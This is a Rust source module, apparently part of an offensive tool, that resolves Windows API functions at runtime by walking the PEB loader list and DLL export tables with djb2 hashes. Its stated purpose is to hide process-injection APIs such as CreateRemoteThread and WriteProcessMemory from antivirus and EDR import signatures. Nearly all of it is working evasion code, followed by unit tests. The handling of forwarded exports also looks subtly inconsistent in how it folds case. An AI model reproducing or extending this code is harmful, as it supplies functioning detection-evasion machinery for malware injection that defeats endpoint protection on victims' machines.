//! Import-stripped WinAPI resolution (AV import-combo reduction, wave 2).
//!
//! The previous build linked `GetModuleHandleA`/`GetProcAddress` and the whole
//! injection set (`CreateProcessW`, `WriteProcessMemory`, `CreateRemoteThread`,
//! `VirtualAllocEx`, `ResumeThread`, …) as *named imports*. AV/EDR import-combo
//! signatures are built from exactly that pattern — founder a binary and the
//! IAT names themselves are the detection.
//!
//! This module resolves the same APIs at runtime with **zero imports**:
//! - module base: walk `PEB → Ldr → InMemoryOrderModuleList`, matching
//!   `BaseDllName` by a const hash (no string lives in the binary)
//! - export address: walk the in-memory export directory, matching the ANSI
//!   name by const hash
//! - entry to locals: a GS-segment read (`gs:[0x60]`) reaches the PEB without
//!   any imported API.
//!
//! Everything here is `unsafe` by design but single-path: pointer math only,
//! no allocation, no strings, no `GetProcAddress` anywhere in the crate.

use core::ptr;
use std::ffi::c_void;

/// offsetof-derived PEB_PEB_LDR_DATA list head pointing at the module list.
/// Layout is stable on amd64 for all supported Windows builds.
const LDR_PEB_OFFSET_LDR: usize = 0x18; // PEB->Ldr
const LDR_IN_LOAD_ORDER_MODULES: usize = 0x10; // PEB_LDR_DATA->InLoadOrderModuleList
const LDR_ENTRY_DLL_BASE: usize = 0x30; // LDR_DATA_TABLE_ENTRY->DllBase
const LDR_ENTRY_BASE_DLL_NAME: usize = 0x58; // LDR_DATA_TABLE_ENTRY->BaseDllName

/// In the InLoadOrderModuleList each node's InLoadOrderLinks is at offset 0,
/// so `LDR_DATA_TABLE_ENTRY` *is* the node — no back-subtraction needed.
fn ldr_entry_of(node: *const c_void) -> *const u8 {
    node as *const u8
}

/// Read the current PEB via the TEB's `ProcessEnvironmentBlock` slot
/// (`gs:[0x60]`). No import — a single instruction.
fn peb() -> *const u8 {
    let mut out: usize = 0;
    // SAFETY: reading the GS segment at a fixed offset is defined behavior on
    // amd64 Windows; the result is treated only as a pointer we dereference
    // against PE structures; we never write.
    unsafe {
        std::arch::asm!(
            "mov {0}, qword ptr gs:[0x60]",
            out(reg) out,
            options(nostack, preserves_flags)
        );
    }
    out as *const u8
}

/// Windows UNICODE_STRING produces (buffer, unit_len) from its length field.
fn unicode_string_at(p: *const u8, len_off: usize, buf_off: usize) -> Option<(*const u16, usize)> {
    let len = read_u16(p, len_off)? as usize;
    let buf = read_ptr(p, buf_off)? as *const u16;
    if len == 0 || buf.is_null() {
        return None;
    }
    Some((buf, len / 2))
}

/// djb2 hash of ASCII bytes — the form we hash export names with.
#[inline]
pub const fn hash_bytes(bytes: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    let mut i = 0;
    while i < bytes.len() {
        h = (h << 5).wrapping_add(h).wrapping_add(bytes[i] as u32);
        i += 1;
    }
    h
}

/// djb2 with ASCII case-folding — LDR stores module basenames in upper case
/// (`KERNEL32.DLL`), and djb2 is case-sensitive, so module lookups hash the
/// folded form.
#[inline]
pub const fn hash_mod_bytes(bytes: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        let c = if b.is_ascii_lowercase() { b - 32 } else { b };
        h = (h << 5).wrapping_add(h).wrapping_add(c as u32);
        i += 1;
    }
    h
}

/// djb2 over the *low byte* of each UTF-16 unit — matches `hash_bytes` for
/// ASCII module names, which is all we need (kernel32.dll, ntdll.dll, …).
/// Hash a UNICODE_STRING buffer via unaligned reads (never a real slice, so
/// no UB-slice check can fire on a loader-provided pointer). Folds ASCII
/// case to upper — matches [`hash_mod_bytes`] regardless of how LDR stored
/// the name (ntdll.dll lowercase, KERNEL32.DLL uppercase, both common).
fn hash_unicode(buf: *const u16, unit_len: usize) -> u32 {
    let mut h: u32 = 5381;
    for i in 0..unit_len.min(260) {
        // SAFETY: buffer came from LDR (loader-owned, lives for the walk);
        // reads are unaligned and counted, clamped well below isize::MAX.
        let w = unsafe { ptr::read_unaligned(buf.wrapping_add(i)) };
        let lo = (w & 0xFF) as u8;
        let c = if lo.is_ascii_lowercase() { lo - 32 } else { lo };
        h = (h << 5).wrapping_add(h).wrapping_add(c as u32);
    }
    h
}

fn read_u16(p: *const u8, off: usize) -> Option<u16> {
    // SAFETY: offsets are within loader structures we validated at walk time;
    // reads are unaligned so no alignment assumption.
    unsafe { Some(ptr::read_unaligned(p.wrapping_add(off) as *const u16)) }
}

fn read_u32(p: *const u8, off: usize) -> Option<u32> {
    // SAFETY: see read_u16.
    unsafe { Some(ptr::read_unaligned(p.wrapping_add(off) as *const u32)) }
}

fn read_ptr(p: *const u8, off: usize) -> Option<usize> {
    // SAFETY: see read_u16.
    unsafe { Some(ptr::read_unaligned(p.wrapping_add(off) as *const usize)) }
}

/// Find the base address of the loaded module whose `BaseDllName` hashes to
/// `name_hash` (hash of e.g. `b"kernel32.dll"` via [`hash_bytes`]).
pub fn module_base(name_hash: u32) -> Option<usize> {
    let peb = peb();
    let ldr = read_ptr(peb, LDR_PEB_OFFSET_LDR)? as *const u8;
    let head = read_ptr(ldr, LDR_IN_LOAD_ORDER_MODULES)? as *const u8;
    let mut node = read_ptr(head, 0x0)? as *const u8; // head->Flink
    let mut guard = 0usize;
    while !node.is_null() && !ptr::eq(node, head) && guard < 512 {
        let entry = ldr_entry_of(node as *const c_void);
        let (name, name_len) = unicode_string_at(
            entry,
            LDR_ENTRY_BASE_DLL_NAME,
            LDR_ENTRY_BASE_DLL_NAME + 0x8,
        )?;
        if hash_unicode(name, name_len) == name_hash {
            return read_ptr(entry, LDR_ENTRY_DLL_BASE);
        }
        node = read_ptr(node, 0x0)? as *const u8; // node->Flink
        guard += 1;
    }
    None
}

/// Export-directory walk: locate an export by hashed name inside the module
/// rooted at `base`. Operates on the in-memory image (RVA + base == VA).
pub fn export_addr(base: usize, name_hash: u32) -> Option<usize> {
    let b = base as *const u8;
    // DOS header → NT headers (PE32+ for amd64).
    let e_lfanew = read_u32(b, 0x3C)? as usize;
    let nt = b.wrapping_add(e_lfanew);
    let opt = nt.wrapping_add(0x18);
    // DataDirectory[0] = export: RVA at +0x70, size at +0x74 (PE32+).
    let export_rva = read_u32(opt, 0x70)? as usize;
    let export_size = read_u32(opt, 0x74)? as usize;
    if export_rva == 0 || export_size < 40 {
        return None;
    }
    let exp = b.wrapping_add(export_rva);
    // IMAGE_EXPORT_DIRECTORY:
    //  +0x14 NumberOfFunctions, +0x18 NumberOfNames,
    //  +0x1C AddressOfFunctions, +0x20 AddressOfNames, +0x24 AddressOfNameOrdinals.
    let num_funcs = read_u32(exp, 0x14)? as usize;
    let num_names = read_u32(exp, 0x18)? as usize;
    let addr_funcs = read_u32(exp, 0x1C)? as usize;
    let addr_names = read_u32(exp, 0x20)? as usize;
    let addr_ordinals = read_u32(exp, 0x24)? as usize;

    if num_names == 0
        || num_funcs == 0
        || num_names * 4 > export_size
        || num_funcs * 4 > export_size
        || num_names * 2 > export_size
    {
        return None;
    }

    for i in 0..num_names {
        let name_rva = read_u32(b, addr_names + i * 4)? as usize;
        let name_p = b.wrapping_add(name_rva);
        // Hash the C-string (bound-capped, not just null-sentinel).
        let mut h: u32 = 5381;
        let mut k = 0usize;
        while k < 512 {
            // SAFETY: name lives inside the mapped module; k is clamped so we
            // never walk off the image in a degenerate export.
            let byte = unsafe { ptr::read(name_p.wrapping_add(k)) };
            if byte == 0 {
                break;
            }
            h = (h << 5).wrapping_add(h).wrapping_add(byte as u32);
            k += 1;
        }
        if h == name_hash {
            let ord = read_u16(b, addr_ordinals + i * 2)? as usize;
            let func_rva = read_u32(b, addr_funcs + ord * 4)? as usize;
            // Forwarded export: "KERNELBASE.CreateProcessW"-style strings live
            // inside the export directory itself, not at a real RVA. Follow
            // the target once so x64 shims (kernel32 → kernelbase) resolve.
            if func_rva >= export_rva && func_rva < export_rva + export_size {
                return forwarded(nth_dot_hashed(b, export_size, func_rva));
            }
            return Some(b.wrapping_add(func_rva) as usize);
        }
    }
    None
}

/// Parse a forwarder string and resolve it: returns the target module/name
/// hashes (module folded to match LDR, name folded to match the target's own
/// letter-casing — forwarder strings copy the case of the original export).
fn nth_dot_hashed(b: *const u8, export_size: usize, func_rva: usize) -> Option<(u32, u32)> {
    let s = b.wrapping_add(func_rva);
    let len = cstr_len(s, export_size)?;
    let mut dot = 0usize;
    for i in 0..len {
        // SAFETY: i < len, bounded by export_size; see forwarder string docs.
        if unsafe { ptr::read(s.wrapping_add(i)) } == b'.' {
            dot = i;
            break;
        }
    }
    if dot == 0 {
        return None;
    }
    let mut mod_hash = 5381u32;
    for i in 0..dot {
        let c = unsafe { ptr::read(s.wrapping_add(i)) };
        mod_hash = (mod_hash << 5)
            .wrapping_add(mod_hash)
            .wrapping_add(fold(c) as u32);
    }
    let mut fn_hash = 5381u32;
    for i in dot + 1..len {
        let c = unsafe { ptr::read(s.wrapping_add(i)) };
        fn_hash = (fn_hash << 5)
            .wrapping_add(fn_hash)
            .wrapping_add(fold(c) as u32);
    }
    Some((mod_hash, fn_hash))
}

fn forwarded(hashes: Option<(u32, u32)>) -> Option<usize> {
    hashes.and_then(|(m, f)| {
        let base = module_base(m)?;
        export_addr(base, f)
    })
}

fn cstr_len(s: *const u8, cap: usize) -> Option<usize> {
    let mut k = 0usize;
    while k < cap {
        // SAFETY: reads the C-string inside the export directory, k < cap.
        if unsafe { ptr::read(s.wrapping_add(k)) } == 0 {
            return Some(k);
        }
        k += 1;
    }
    None
}

#[inline]
const fn fold(c: u8) -> u8 {
    if c.is_ascii_lowercase() { c - 32 } else { c }
}

/// Resolve a WinAPI function at runtime to a raw address.
/// `module` is the hash of the DLL filename (e.g. [`hash_mod_bytes`] of
/// `b"kernel32.dll"`), `func` the hash of the export name. Returns the
/// function address or None (module absent / export missing / bad image).
pub fn api(module: u32, func: u32) -> Option<usize> {
    let base = module_base(module)?;
    export_addr(base, func)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hash_bytes_matches_known_djb2() {
        // djb2("LoadLibraryA") — golden so layout/hash regressions surface.
        assert_eq!(hash_bytes(b"LoadLibraryA"), 0x5FBFF0FB);
        assert_eq!(hash_bytes(b"GetProcAddress"), 0xCF31BB1F);
    }

    #[test]
    fn hash_mod_bytes_folds_case() {
        // Module lookups fold case — LDR stores names as KERNEL32.DLL.
        assert_eq!(hash_mod_bytes(b"kernel32.dll"), 0x6DDB9555);
        assert_eq!(hash_mod_bytes(b"ntdll.dll"), 0x1EDAB0ED);
        // Still distinct from the un-folded pure hash.
        assert_ne!(hash_bytes(b"kernel32.dll"), hash_mod_bytes(b"kernel32.dll"));
    }

    #[test]
    fn peb_is_reachable() {
        let p = peb();
        // PEB of a live process is never null and never the stack.
        assert!(!p.is_null());
        assert!((p as usize) > 0x10000);
    }

    #[test]
    fn kernel32_base_resolves() {
        let base = module_base(hash_mod_bytes(b"kernel32.dll"));
        assert!(base.is_some(), "kernel32 must be in the load list");
        let base = base.unwrap();
        // A loaded DLL base points at its MZ header.
        // SAFETY: base is the freshly-resolved module base; reading the MZ
        // signature is part of validating the walk.
        let mz = unsafe { ptr::read_unaligned(base as *const u16) };
        assert_eq!(mz, 0x5A4D, "module base must start with MZ");
    }

    #[test]
    fn ntdll_base_resolves() {
        assert!(
            module_base(hash_mod_bytes(b"ntdll.dll")).is_some(),
            "ntdll must be in the load list"
        );
    }

    #[test]
    fn kernel32_loadlibrary_a_resolves_to_nonzero() {
        let addr = api(hash_mod_bytes(b"kernel32.dll"), hash_bytes(b"LoadLibraryA"));
        assert!(addr.is_some());
        let addr = addr.unwrap();
        assert!(addr > 0x10000, "resolved address in user space");
    }

    #[test]
    fn nonexistent_export_returns_none() {
        assert_eq!(
            api(
                hash_mod_bytes(b"kernel32.dll"),
                hash_bytes(b"DefinitelyNotAnExport_Gnaw")
            ),
            None
        );
    }

    #[test]
    fn hash_unicode_matches_hash_mod_bytes_for_ascii() {
        // "kernel32.dll" as UTF-16 low bytes: hash_unicode must agree with
        // hash_mod_bytes because both fold case and read the low byte.
        let wide: Vec<u16> = "KERNEL32.DLL".encode_utf16().collect();
        assert_eq!(
            hash_unicode(wide.as_ptr(), wide.len()),
            hash_mod_bytes(b"kernel32.dll")
        );
    }
}
